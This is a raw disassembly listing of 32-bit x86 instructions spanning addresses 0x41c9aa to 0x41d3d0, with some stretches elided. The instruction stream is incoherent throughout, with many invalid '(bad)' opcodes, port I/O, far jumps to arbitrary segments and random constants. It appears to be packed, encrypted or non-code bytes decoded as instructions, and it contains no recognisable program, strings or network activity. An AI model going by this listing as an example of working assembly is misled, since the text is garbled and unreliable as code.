  41c9aa:	jecxz  0x41c9c0
  41c9ac:	xor    ebx,eax
  41c9ae:	jbe    0x41c9ce
  41c9b0:	xchg   ebp,eax
  41c9b1:	mov    dl,0x94
  41c9b3:	fwait
  41c9b4:	add    ebx,DWORD PTR ds:0xd39cea58
  41c9ba:	fisttp WORD PTR [edi+0x7c0b69e8]
  41c9c0:	out    dx,al
  41c9c1:	out    dx,eax
  41c9c2:	jnp    0x41c9e4
  41c9c4:	in     al,0xae
  41c9c6:	mov    cl,0x4d
  41c9c8:	in     al,0x94
  41c9ca:	mov    esi,0xf54e75b7
  41c9cf:	mov    dl,0xd7
  41c9d1:	mov    dh,0x96
  41c9d3:	sbb    esi,esp
  41c9d5:	xor    al,0x4c
  41c9d7:	or     eax,0x91c428ac
  41c9dc:	or     DWORD PTR [ebx],edx
  41c9de:	out    dx,al
  41c9df:	mov    bh,0xbb
  41c9e1:	mov    esp,0x8ac67d10
  41c9e6:	inc    eax
  41c9e7:	mov    eax,es
  41c9e9:	mov    dl,0xec
  41c9eb:	mov    ecx,0x2b621343
  41c9f0:	loop   0x41c9f1
  41c9f2:	jns    0x41c9aa
  41c9f4:	ds ror edx,1
  41c9f7:	fbld   TBYTE PTR ds:0x2d078d99
  41c9fd:	in     eax,0xe8
  41c9ff:	sbb    al,BYTE PTR [esi-0x5]
  41ca02:	pop    ss
  41ca03:	cli    
  41ca04:	pop    esi
  41ca05:	arpl   WORD PTR [edx],dx
  41ca07:	test   al,0x93
  41ca09:	lods   eax,DWORD PTR ds:[esi]
  41ca0a:	ret    0xdd57
  41ca0d:	xchg   ah,ch
  41ca0f:	push   0x0
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	(bad)
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	adc    al,0xe0
  41ca8e:	mov    ah,0xd7
  41ca90:	mov    esi,DWORD PTR [eax-0x7d]
  41ca93:	sbb    eax,0x98342eb0
  41ca98:	ror    DWORD PTR [esi],1
  41ca9a:	sub    ecx,DWORD PTR [ecx]
  41ca9c:	mov    ch,BYTE PTR [eax+0x70feae32]
  41caa2:	leave  
  41caa3:	push   es
  41caa4:	cmp    esi,DWORD PTR [ebx+esi*2+0x6d3e737]
  41caab:	mov    bh,0x71
  41caad:	arpl   WORD PTR [eax+0xfa1c59],sp
  41cab3:	iret   
  41cab4:	add    BYTE PTR [edi+edx*1+0x3a],ah
  41cab8:	mov    eax,DWORD PTR [ebp-0x5a]
  41cabb:	aaa    
  41cabc:	or     ch,dh
  41cabe:	xchg   ebp,eax
  41cabf:	scas   eax,DWORD PTR es:[edi]
  41cac0:	retf   
  41cac1:	mov    edx,0x51b20aab
  41cac6:	or     BYTE PTR [eax],0x4c
  41cac9:	(bad)  
  41caca:	into   
  41cacb:	test   DWORD PTR [edx+0x2b],ebp
  41cace:	mov    ah,BYTE PTR [esi+0x76]
  41cad1:	shl    BYTE PTR [edx-0x9],1
  41cad4:	lods   al,BYTE PTR ds:[esi]
  41cad5:	inc    ebx
  41cad6:	mov    cl,0x2b
  41cad8:	lods   eax,DWORD PTR ds:[esi]
  41cad9:	mov    ah,0xc8
  41cadb:	jge    0x41ca70
  41cadd:	jno    0x41cae3
  41cadf:	sbb    eax,0xcefbad8e
  41cae4:	iret   
  41cae5:	inc    esp
  41cae6:	sub    DWORD PTR [esi-0x7ee3a3b4],ebp
  41caec:	cli    
  41caed:	adc    eax,DWORD PTR [ecx+0x7e18d01a]
  41caf3:	xor    bl,BYTE PTR [eax-0x5b]
  41caf6:	sar    ebp,1
  41caf8:	jp     0x41cb03
  41cafa:	js     0x41ca88
  41cafc:	enter  0xf9f5,0xb2
  41cb00:	push   es
  41cb01:	adc    bh,BYTE PTR [edi+0x208d4c32]
  41cb07:	repnz or BYTE PTR [edi-0x63],0x5a
  41cb0c:	cli    
  41cb0d:	clc    
  41cb0e:	pop    ecx
  41cb0f:	dec    eax
  41cb10:	push   0x5c
  41cb12:	push   cs
  41cb13:	inc    ebp
  41cb14:	mov    esp,0x984ba0c1
  41cb19:	mov    eax,ds:0xa4a00d99
  41cb1e:	out    dx,al
  41cb1f:	sub    ah,BYTE PTR [esi+0xbbe5a89]
  41cb25:	cmp    ecx,eax
  41cb27:	xchg   ebx,eax
  41cb28:	cli    
  41cb29:	fisubr DWORD PTR [ebx-0x61]
  41cb2c:	sbb    al,0xf9
  41cb2e:	push   edi
  41cb2f:	add    ebx,ebp
  41cb31:	call   0x27783463
  41cb36:	mov    dl,0x3
  41cb38:	jnp    0x41cb6d
  41cb3a:	mov    WORD PTR [ebx-0x77d6ae91],ss
  41cb40:	cmp    dl,BYTE PTR [ecx]
  41cb42:	cmp    esi,DWORD PTR [ebx-0x35]
  41cb45:	or     dl,ah
  41cb47:	dec    ebp
  41cb48:	(bad)  
  41cb49:	push   0xc2ebc704
  41cb4e:	pop    es
  41cb4f:	pop    ebp
  41cb50:	bound  edi,QWORD PTR [ebp+0x2085650e]
  41cb56:	add    al,0x43
  41cb58:	and    eax,0x4750660b
  41cb5d:	outs   dx,DWORD PTR ds:[esi]
  41cb5e:	xor    al,0x25
  41cb60:	js     0x41cbdc
  41cb62:	call   0xc075:0xa54deedf
  41cb69:	add    eax,0x449e0564
  41cb6e:	mov    ebx,0x1f87ee82
  41cb73:	retf   
  41cb74:	fnsave [edx]
  41cb76:	enter  0x3ef9,0xc1
  41cb7a:	in     al,0x44
  41cb7c:	and    al,0x61
  41cb7e:	xor    al,0xbb
  41cb80:	push   ebx
  41cb81:	fcom   QWORD PTR [edi-0x73e1dd11]
  41cb87:	ficom  DWORD PTR [esi-0x7e1b2728]
  41cb8d:	jo     0x41cbce
  41cb8f:	arpl   WORD PTR [eax],ax
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xe3d17c22
  41cc03:	mov    al,ds:0x13154
  41cc08:	add    al,0x1
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	inc    al
  41cc0e:	ins    BYTE PTR es:[edi],dx
  41cc0f:	add    DWORD PTR [ecx+ecx*8+0x44],ebx
  41cc13:	add    DWORD PTR [edx+edx*8+0x49],0xe5d2fd20
  41cc1b:	and    ah,bh
  41cc1d:	xor    BYTE PTR [edx],bh
  41cc1f:	sub    eax,0x69dedcc6
  41cc24:	sahf   
  41cc25:	test   eax,0x9984976b
  41cc2a:	mov    esi,0xda254f62
  41cc2f:	cmp    al,0x11
  41cc31:	retf   
  41cc32:	ret    
  41cc33:	in     eax,0x68
  41cc35:	(bad)  
  41cc36:	and    eax,0x79e63abe
  41cc3b:	sti    
  41cc3c:	dec    ebp
  41cc3d:	inc    ebx
  41cc3e:	mov    esi,0x250179dd
  41cc43:	hlt    
  41cc44:	arpl   WORD PTR [ecx+0x4bae5e51],bp
  41cc4a:	add    esi,DWORD PTR [esi]
  41cc4c:	adc    ecx,DWORD PTR [ebp+0x7a]
  41cc4f:	xor    BYTE PTR [edx-0x72],cl
  41cc52:	push   edi
  41cc53:	popf   
  41cc54:	jnp    0x41cc73
  41cc56:	mov    ebp,0x25bbf980
  41cc5b:	jbe    0x41ccb4
  41cc5d:	add    DWORD PTR [ecx+esi*2-0x3b],0xffffff90
  41cc62:	jb     0x41cc14
  41cc64:	(bad)  [eax]
  41cc66:	ret    
  41cc67:	pop    ss
  41cc68:	popa   
  41cc69:	ret    
  41cc6a:	inc    esp
  41cc6b:	clc    
  41cc6c:	pop    edx
  41cc6d:	jb     0x41cc9e
  41cc6f:	test   BYTE PTR [ebx],ch
  41cc71:	mov    ah,0x45
  41cc73:	fild   QWORD PTR [edx]
  41cc75:	retf   0xabc6
  41cc78:	outs   dx,DWORD PTR ds:[esi]
  41cc79:	dec    ecx
  41cc7a:	adc    dh,BYTE PTR [edi]
  41cc7c:	push   0xffffffba
  41cc7e:	sub    eax,0x3c459a38
  41cc83:	cmp    al,0x33
  41cc85:	jg     0x41cc0b
  41cc87:	aaa    
  41cc88:	js     0x41cc10
  41cc8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc8b:	pop    edx
  41cc8c:	stc    
  41cc8d:	xchg   di,ax
  41cc8f:	mov    al,0x83
  41cc91:	mov    es,WORD PTR ss:[ebp+edx*2+0x643e77fd]
  41cc99:	cmp    BYTE PTR [ecx+0x2f09e0c6],al
  41cc9f:	xor    al,0xbc
  41cca1:	jecxz  0x41cc9b
  41cca3:	call   0x924fac6
  41cca8:	add    al,0x46
  41ccaa:	pop    esi
  41ccab:	test   DWORD PTR [ebp-0x460dc0e8],esp
  41ccb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccb2:	psubsw mm0,QWORD PTR [esp+ebp*1]
  41ccb6:	pop    edx
  41ccb7:	(bad)  
  41ccb8:	cwde   
  41ccb9:	push   0xffffffd3
  41ccbb:	(bad)  
  41ccbc:	aam    0x85
  41ccbe:	pop    DWORD PTR [edi]
  41ccc0:	ins    DWORD PTR es:[edi],dx
  41ccc1:	sub    ah,ah
  41ccc3:	xchg   edi,eax
  41ccc4:	mov    dh,0xf5
  41ccc6:	mov    dl,0x75
  41ccc8:	push   0x30
  41ccca:	mov    dh,0x80
  41cccc:	adc    ecx,DWORD PTR [esp+esi*1]
  41cccf:	pop    esp
  41ccd0:	and    eax,0xfa8ff54c
  41ccd5:	inc    esp
  41ccd6:	outs   dx,DWORD PTR ds:[esi]
  41ccd7:	or     bl,ch
  41ccd9:	pop    ss
  41ccda:	adc    eax,0x12313747
  41ccdf:	ficomp WORD PTR [ecx+0x2cb6989a]
  41cce5:	push   edx
  41cce6:	xor    eax,0xc42ce9e4
  41cceb:	sub    DWORD PTR [eax+eiz*4],ebp
  41ccee:	fnstcw WORD PTR [edx-0x3b]
  41ccf1:	and    cl,BYTE PTR [edi]
  41ccf3:	fstp   QWORD PTR [edi-0x7f]
  41ccf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccf7:	push   cs
  41ccf8:	mov    bh,BYTE PTR [ecx-0x59b39e8c]
  41ccfe:	neg    DWORD PTR [esi+0x2a1dd651]
  41cd04:	stos   BYTE PTR es:[edi],al
  41cd05:	push   cs
  41cd06:	gs sbb esp,edi
  41cd09:	mov    edi,DWORD PTR [ebx+0x508884f0]
  41cd0f:	adc    al,BYTE PTR [eax]
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	and    BYTE PTR [esi-0x67],dl
  41cd83:	add    DWORD PTR [eax+0x32],ebx
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    al,0x1
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	mov    ds:0x2c87b529,eax
  41cd91:	jge    0x41cd9a
  41cd93:	xor    al,0x75
  41cd95:	enter  0x822c,0x88
  41cd99:	sahf   
  41cd9a:	jle    0x41cd2c
  41cd9c:	add    BYTE PTR [eax],dh
  41cd9e:	jl     0x41cd8d
  41cda0:	rep ins DWORD PTR es:[edi],dx
  41cda2:	cwde   
  41cda3:	rcl    ebp,cl
  41cda5:	pop    esi
  41cda6:	fbld   TBYTE PTR [edx-0x4fd48d47]
  41cdac:	mov    al,0xcb
  41cdae:	ins    BYTE PTR es:[edi],dx
  41cdaf:	sub    eax,0xbf5285c0
  41cdb4:	lods   eax,DWORD PTR ds:[esi]
  41cdb5:	mov    al,0x1
  41cdb7:	call   0xe5a0e37a
  41cdbc:	xchg   esp,eax
  41cdbd:	ret    
  41cdbe:	in     al,dx
  41cdbf:	sub    esp,DWORD PTR ds:0x878e475c
  41cdc5:	push   0x3d8ce070
  41cdca:	cmp    eax,0x1b329d7
  41cdcf:	mov    dl,0x9c
  41cdd1:	outs   dx,DWORD PTR ds:[esi]
  41cdd2:	test   BYTE PTR [eax],ah
  41cdd4:	fwait
  41cdd5:	add    al,0x5
  41cdd7:	push   es
  41cdd8:	mov    dh,BYTE PTR [ebx-0x54]
  41cddb:	xor    eax,0x25ee3902
  41cde0:	mov    eax,ds:0x35f335fd
  41cde5:	mov    WORD PTR [edx-0x71],cs
  41cde8:	pop    esp
  41cde9:	test   eax,0x52e4e8ee
  41cdee:	mov    edi,0x2e527803
  41cdf3:	push   cs
  41cdf4:	cmp    eax,0xf85d053d
  41cdf9:	gs and eax,0x4609bd62
  41cdff:	mov    ebp,0x8cfb051c
  41ce04:	mov    edi,0xddeff667
  41ce09:	mov    al,ds:0xbf6293da
  41ce0e:	mov    al,ds:0xf971a04d
  41ce13:	lods   al,BYTE PTR ds:[esi]
  41ce14:	jge    0x41ce13
  41ce16:	fwait
  41ce17:	jmp    0x1ea0:0xfc6da6c2
  41ce1e:	pop    ss
  41ce1f:	pop    ebp
  41ce20:	jle    0x41cdbb
  41ce22:	int    0x22
  41ce24:	mov    esi,0x415909ee
  41ce29:	mov    bh,0xf4
  41ce2b:	lahf   
  41ce2c:	and    ecx,ebp
  41ce2e:	pop    esp
  41ce2f:	hlt    
  41ce30:	inc    edx
  41ce31:	adc    al,0x95
  41ce33:	fadd   QWORD PTR [eax]
  41ce35:	mov    cl,0x7b
  41ce37:	daa    
  41ce38:	pop    ss
  41ce39:	add    eax,0xfa2d88
  41ce3e:	gs inc eax
  41ce40:	inc    ecx
  41ce41:	mov    ss,WORD PTR [ebx-0x6d1e0bff]
  41ce47:	jmp    0xecca:0x35d9fd36
  41ce4e:	sbb    BYTE PTR [edx-0x491cf3b8],0xcb
  41ce55:	jae    0x41cec0
  41ce57:	out    dx,eax
  41ce58:	cmp    BYTE PTR [edx],dh
  41ce5a:	int    0xe
  41ce5c:	shl    DWORD PTR [ebp+edi*4-0x3496b8e4],0x92
  41ce64:	mov    ebx,0xe60706b9
  41ce69:	arpl   ax,ax
  41ce6b:	jne    0x41ce5f
  41ce6d:	sahf   
  41ce6e:	mov    dh,0xbc
  41ce70:	jnp    0x41cecd
  41ce72:	push   edx
  41ce73:	(bad)  
  41ce74:	(bad)  
  41ce75:	jl     0x41cea6
  41ce77:	cs push ss
  41ce79:	xlat   BYTE PTR ds:[ebx]
  41ce7a:	out    0x7f,al
  41ce7c:	push   esp
  41ce7d:	push   edi
  41ce7e:	push   es
  41ce7f:	jae    0x41ce48
  41ce81:	mov    cl,0x5c
  41ce83:	test   BYTE PTR [edi+edx*1],al
  41ce86:	popa   
  41ce87:	mov    WORD PTR [edx],cs
  41ce89:	xor    ecx,DWORD PTR [ecx*8-0x3c238c32]
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	mov    eax,0x5c090607
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	pop    ebx
  41cf0d:	dec    eax
  41cf0e:	jmp    0x41ceff
  41cf10:	mov    dh,0x42
  41cf12:	icebp  
  41cf13:	pop    esp
  41cf14:	aaa    
  41cf15:	fs (bad) 
  41cf17:	jp     0x41cee9
  41cf19:	aas    
  41cf1a:	cmp    ebx,DWORD PTR [edi+edx*8-0x30689068]
  41cf21:	mov    ebp,0xef277b9d
  41cf26:	sbb    eax,0x8ebc764d
  41cf2b:	sbb    ebp,DWORD PTR [edi-0x70]
  41cf2e:	xlat   BYTE PTR ds:[ebx]
  41cf2f:	jbe    0x41cf96
  41cf31:	call   0x2cb8:0x92804c3e
  41cf38:	pop    edi
  41cf39:	add    ebx,esi
  41cf3b:	xchg   DWORD PTR [eax+0x35],ebx
  41cf3e:	xor    DWORD PTR [esi],eax
  41cf40:	xchg   edi,eax
  41cf41:	jmp    0xfab3:0xa781c42d
  41cf48:	push   es
  41cf49:	sahf   
  41cf4a:	mov    dl,0x9d
  41cf4c:	fs fdiv st,st(2)
  41cf4f:	mov    ch,0x53
  41cf51:	mov    bl,0xcc
  41cf53:	and    ecx,DWORD PTR [ebx+0x6]
  41cf56:	sub    al,0xc
  41cf58:	push   ebp
  41cf59:	adc    DWORD PTR [edx+0x1c],eax
  41cf5c:	ret    
  41cf5d:	rcl    DWORD PTR [ebx-0x43431840],0x8c
  41cf64:	scas   eax,DWORD PTR es:[edi]
  41cf65:	or     DWORD PTR [edi+0x68],esi
  41cf68:	cdq    
  41cf69:	pop    esp
  41cf6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf6b:	pop    esi
  41cf6c:	xor    eax,DWORD PTR [ebx+0x3c]
  41cf6f:	test   DWORD PTR [esi-0x296e514a],eax
  41cf75:	mov    bl,0xf9
  41cf77:	test   BYTE PTR [edi-0x277fc3e2],0x50
  41cf7e:	sub    eax,0xbb2593a6
  41cf83:	in     eax,dx
  41cf84:	lods   al,BYTE PTR ds:[esi]
  41cf85:	mov    cl,0xcd
  41cf87:	or     BYTE PTR [edx-0x2],ch
  41cf8a:	cmp    eax,0xae4243c7
  41cf8f:	add    esi,esi
  41cf91:	dec    eax
  41cf92:	inc    ebx
  41cf93:	inc    ebx
  41cf94:	inc    DWORD PTR [esp+ecx*1-0x72df17d5]
  41cf9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf9c:	arpl   WORD PTR ds:0xe38640a0,di
  41cfa2:	xchg   BYTE PTR [edi],bh
  41cfa4:	sub    BYTE PTR [ecx-0x63c975c4],ah
  41cfaa:	pop    edi
  41cfab:	add    eax,0x4dcbaec3
  41cfb0:	(bad)  
  41cfb1:	outs   dx,BYTE PTR ds:[esi]
  41cfb2:	ret    0xec80
  41cfb5:	idiv   BYTE PTR [eax]
  41cfb7:	cs es js 0x41d038
  41cfbb:	test   eax,0x5053b21a
  41cfc0:	hlt    
  41cfc1:	inc    esp
  41cfc2:	mov    ds:0x9153f425,al
  41cfc7:	and    esp,DWORD PTR [ebp*8-0x19a682f5]
  41cfce:	add    esi,DWORD PTR [ecx+0x3a4eb8a6]
  41cfd4:	(bad)  
  41cfd5:	rol    dh,cl
  41cfd7:	fist   DWORD PTR [eax+0x7a]
  41cfda:	iret   
  41cfdb:	cmp    esi,edi
  41cfdd:	sbb    bl,BYTE PTR [eax]
  41cfdf:	popf   
  41cfe0:	sti    
  41cfe1:	pop    ebp
  41cfe2:	mov    ebp,0x5a24cea8
  41cfe7:	addr16 dec ebp
  41cfe9:	sub    DWORD PTR [edx],0xc8561254
  41cfef:	sar    DWORD PTR [ecx+0x72405fc2],cl
  41cff5:	and    edx,0x58
  41cff8:	jecxz  0x41d02d
  41cffa:	div    ah
  41cffc:	mov    esp,0xefa94783
  41d001:	push   0xffffffea
  41d003:	xchg   esp,eax
  41d004:	dec    eax
  41d005:	push   ss
  41d006:	jmp    0x19b6:0x8a777548
  41d00d:	adc    BYTE PTR [eax+0x8b],bl
	...
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x273cedbd
  41d083:	outs   dx,DWORD PTR ds:[esi]
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	dec    eax
  41d08d:	mov    edx,0xe2808e34
  41d092:	stos   BYTE PTR es:[edi],al
  41d093:	add    esi,DWORD PTR [esi-0x11]
  41d096:	cmp    al,0xaf
  41d098:	ret    0x4e7a
  41d09b:	les    ebx,FWORD PTR [ecx-0x28]
  41d09e:	fwait
  41d09f:	leave  
  41d0a0:	push   ecx
  41d0a1:	xor    eax,0xa108f671
  41d0a6:	push   ebx
  41d0a7:	imul   ebx,eax,0x696205a1
  41d0ad:	mov    esp,0x40090960
  41d0b2:	shl    bl,cl
  41d0b4:	sbb    BYTE PTR [ebp+ecx*8+0x3ed533f2],cl
  41d0bb:	sbb    DWORD PTR [ebx-0x1c],edx
  41d0be:	lock push 0x6c926089
  41d0c4:	ins    DWORD PTR es:[edi],dx
  41d0c5:	mov    bl,0x24
  41d0c7:	cmp    ebx,0x6d
  41d0ca:	rol    esp,0x33
  41d0cd:	test   al,0x92
  41d0cf:	cmp    al,0xad
  41d0d1:	mov    ah,0xb0
  41d0d3:	(bad)  
  41d0d5:	and    cl,BYTE PTR [eax+eiz*1+0x57]
  41d0d9:	ss test al,0xce
  41d0dc:	and    esp,eax
  41d0de:	fnstcw WORD PTR [edx-0x45]
  41d0e1:	add    esi,DWORD PTR [ecx+0x6b37c229]
  41d0e7:	mov    dl,BYTE PTR [ecx-0x47]
  41d0ea:	xchg   esp,eax
  41d0eb:	mov    bl,0xf4
  41d0ed:	fsubr  QWORD PTR [edx]
  41d0ef:	cmp    eax,DWORD PTR ds:0x887bf941
  41d0f5:	jmp    0x837e:0x36cf6d26
  41d0fc:	arpl   bp,si
  41d0fe:	in     eax,dx
  41d0ff:	add    eax,0xc86a06fd
  41d104:	sahf   
  41d105:	xor    DWORD PTR [ecx-0x697d4e17],edx
  41d10b:	ja     0x41d121
  41d10d:	xchg   BYTE PTR [edi],bl
  41d10f:	call   0xd023:0xd9f76335
  41d116:	dec    edi
  41d117:	and    al,0x4f
  41d119:	pusha  
  41d11a:	cwde   
  41d11b:	fcom   st(2)
  41d11d:	mov    al,ds:0x6b795e93
  41d122:	push   cs
  41d123:	jp     0x41d142
  41d125:	ret    
  41d126:	in     al,dx
  41d127:	add    ebp,edx
  41d129:	xchg   edx,eax
  41d12a:	push   cs
  41d12b:	jb     0x41d115
  41d12d:	mov    ebp,0x18575e2
  41d132:	and    DWORD PTR [edx-0x32],0xde6e28f4
  41d139:	add    al,0x24
  41d13b:	add    ebp,ebp
  41d13d:	sub    eax,0x93375ac6
  41d142:	fwait
  41d143:	sbb    eax,0xc76ac0f7
  41d148:	adc    al,0xd9
  41d14a:	fiadd  WORD PTR [edx-0x133850a]
  41d150:	mov    ds:0x4332ab4b,al
  41d155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d156:	loopne 0x41d191
  41d158:	jnp    0x41d103
  41d15a:	popa   
  41d15b:	outs   dx,BYTE PTR ds:[esi]
  41d15c:	lahf   
  41d15d:	add    ch,BYTE PTR [esi]
  41d15f:	and    DWORD PTR [ebx],ebx
  41d161:	mov    edi,0xe68174b1
  41d166:	and    dl,BYTE PTR [edi-0x47d23cc4]
  41d16c:	out    dx,al
  41d16d:	and    edi,DWORD PTR [ecx-0x35285330]
  41d173:	xlat   BYTE PTR ds:[ebx]
  41d174:	jnp    0x3cb9bb2a
  41d17a:	dec    ebp
  41d17b:	out    dx,al
  41d17c:	xor    BYTE PTR [ebp+0x74],ch
  41d17f:	daa    
  41d180:	adc    ch,BYTE PTR [edi+0x538e6695]
  41d186:	retf   0xc4c8
  41d189:	nop
  41d18a:	mov    ds,WORD PTR [edx+0x7d31a516]
	...
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	cli    
  41d201:	xlat   BYTE PTR ds:[ebx]
  41d202:	dec    eax
  41d203:	dec    ecx
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	pusha  
  41d20d:	addr16 mov eax,esi
  41d210:	ins    DWORD PTR es:[edi],dx
  41d211:	or     al,0xc7
  41d213:	and    ebp,DWORD PTR gs:[edi+0x70]
  41d217:	sub    ecx,DWORD PTR [ebx+eax*1-0x3]
  41d21b:	inc    ebp
  41d21c:	in     ax,0x33
  41d21f:	into   
  41d220:	popf   
  41d221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d222:	aas    
  41d223:	push   ebp
  41d224:	jecxz  0x41d1e4
  41d226:	jbe    0x41d254
  41d228:	jns    0x41d27d
  41d22a:	and    BYTE PTR [ecx],ah
  41d22c:	pop    ebp
  41d22d:	or     bh,BYTE PTR [ebx-0xc8f4dba]
  41d233:	jecxz  0x41d29b
  41d235:	ins    BYTE PTR es:[edi],dx
  41d236:	or     eax,0xc61fcbd3
  41d23b:	push   ebx
  41d23c:	mov    cl,0x4e
  41d23e:	jle    0x41d246
  41d240:	or     DWORD PTR [ebx-0x33],edi
  41d243:	pop    edx
  41d244:	in     eax,0x44
  41d246:	and    BYTE PTR [ebx+edi*4],dl
  41d249:	call   0x43be:0xa4592929
  41d250:	or     BYTE PTR [edx+0x21e8aa6d],ch
  41d256:	nop
  41d257:	adc    DWORD PTR [edx-0x9df9985],ecx
  41d25d:	cmp    eax,0xbd173761
  41d262:	cmp    esp,DWORD PTR [edx]
  41d264:	in     al,dx
  41d265:	jmp    0x41d21c
  41d267:	sub    BYTE PTR cs:[ebx+0x41],ch
  41d26b:	add    eax,0x20b5d42
  41d270:	jae    0x41d2a6
  41d272:	aam    0x8c
  41d274:	jno    0x41d264
  41d276:	(bad)  
  41d277:	ss jo  0x41d226
  41d27a:	jmp    0x22ca945a
  41d27f:	fstp   DWORD PTR [edx-0x57]
  41d282:	mov    dh,0x4d
  41d284:	adc    eax,0xbdb1c478
  41d289:	jb     0x41d2b9
  41d28b:	shl    al,cl
  41d28d:	cmc    
  41d28e:	sbb    BYTE PTR [ecx-0x14],al
  41d291:	inc    edx
  41d292:	(bad)  
  41d293:	shr    BYTE PTR [eax-0x3f],cl
  41d296:	test   eax,0x81e2a7ee
  41d29b:	jo     0x41d298
  41d29d:	pop    esp
  41d29e:	pusha  
  41d29f:	test   BYTE PTR fs:[bp+di],bh
  41d2a3:	in     eax,0x83
  41d2a5:	aad    0xa3
  41d2a7:	fs or  al,0x9a
  41d2aa:	(bad)  
  41d2ab:	push   ds
  41d2ac:	mov    ecx,0xc26b9014
  41d2b1:	fist   DWORD PTR [esi-0x2cf496f5]
  41d2b7:	mov    bh,0x45
  41d2b9:	xlat   BYTE PTR ds:[ebx]
  41d2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2bb:	and    eax,0x932c5c96
  41d2c0:	sbb    edi,DWORD PTR [ebx-0xc750ca8]
  41d2c6:	test   al,0xe2
  41d2c8:	bound  edx,QWORD PTR [ebx]
  41d2ca:	mov    al,0xb8
  41d2cc:	xor    ah,dl
  41d2ce:	jle    0x41d2f2
  41d2d0:	xchg   esp,eax
  41d2d1:	add    edx,edx
  41d2d3:	(bad)  
  41d2d4:	cmp    cl,bh
  41d2d6:	or     DWORD PTR [ecx+0x7f],edi
  41d2d9:	ss sub al,0xc6
  41d2dc:	sti    
  41d2dd:	xchg   esp,eax
  41d2de:	(bad)  
  41d2df:	cmp    ebx,DWORD PTR [ebx+0x78]
  41d2e2:	sbb    ah,BYTE PTR [ecx]
  41d2e4:	push   esp
  41d2e5:	and    al,0xfc
  41d2e7:	xchg   ecx,eax
  41d2e8:	cmp    ah,dl
  41d2ea:	mov    cl,0x16
  41d2ec:	and    esp,esi
  41d2ee:	or     BYTE PTR [edx],ah
  41d2f0:	pop    esi
  41d2f1:	int3   
  41d2f2:	pcmpgtw mm3,QWORD PTR [esi]
  41d2f5:	ins    DWORD PTR es:[edi],dx
  41d2f6:	outs   dx,BYTE PTR ds:[esi]
  41d2f7:	mov    fs,WORD PTR [eax+eax*4+0x4216a77d]
  41d2fe:	sub    edx,ebx
  41d300:	cmp    DWORD PTR [esi-0x2c6122fb],0xffffff8d
  41d307:	les    ecx,FWORD PTR [eax]
  41d309:	push   0x40
  41d30b:	mov    cl,0xd6
  41d30d:	outs   dx,BYTE PTR ds:[esi]
  41d30e:	(bad)  
  41d30f:	mov    ds:0x0,eax
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	int3   
  41d381:	jl     0x41d380
  41d383:	lock push 0x4000136
  41d389:	add    DWORD PTR [eax],eax
  41d38b:	add    BYTE PTR [esi+0x5e],dl
  41d38e:	and    eax,eax
  41d390:	xchg   ecx,eax
  41d391:	(bad)  
  41d392:	mov    ds:0x9fb5001d,eax
  41d397:	in     al,0xb5
  41d399:	je     0x41d347
  41d39b:	xchg   edx,eax
  41d39c:	mov    edx,0x743cb560
  41d3a1:	jmp    0xa648:0xf3ab7ab1
  41d3a8:	adc    cl,bh
  41d3aa:	cmc    
  41d3ab:	hlt    
  41d3ac:	push   ds
  41d3ad:	shl    BYTE PTR [edi],1
  41d3af:	(bad)  
  41d3b0:	loope  0x41d375
  41d3b2:	pop    ds
  41d3b3:	mov    ah,0xb7
  41d3b5:	das    
  41d3b6:	inc    edx
  41d3b7:	mov    dh,0x63
  41d3b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3ba:	mov    dh,0xd7
  41d3bc:	test   DWORD PTR [eax+ecx*4-0x19193f42],esp
  41d3c3:	mov    bh,0xef
  41d3c5:	cdq    
  41d3c6:	rol    BYTE PTR [esi+0x11478317],cl
  41d3cc:	enter  0xd178,0x5a
  41d3d0:	call   0xaca7:0x71d53c38
